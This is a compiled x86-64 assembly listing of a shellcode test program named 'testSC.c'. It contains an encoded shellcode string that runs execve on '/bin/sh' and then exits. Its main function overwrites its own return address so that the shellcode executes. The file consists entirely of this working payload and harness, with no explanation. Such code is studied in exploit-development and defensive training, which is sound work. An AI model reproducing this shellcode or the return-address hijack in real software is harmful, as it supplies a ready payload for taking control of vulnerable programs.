	.file	"testSC.c"
	.globl	shellcode
	.data
	.align 32
	.type	shellcode, @object
	.size	shellcode, 77
shellcode:
	.string	"\353-^\306F\007"
	.string	"H\211v\b\307F\020"
	.string	""
	.string	""
	.string	""
	.string	"\270;"
	.string	""
	.string	""
	.string	"H\213~\bH\215v\b\017\005H\307\307"
	.string	""
	.string	""
	.string	""
	.string	"\270<"
	.string	""
	.string	""
	.string	"\017\005\350\316\377\377\377/bin/sh                 "
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	leaq	-8(%rbp), %rax
	addq	$16, %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movl	$shellcode, %edx
	movq	%rdx, (%rax)
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4"
	.section	.note.GNU-stack,"",@progbits
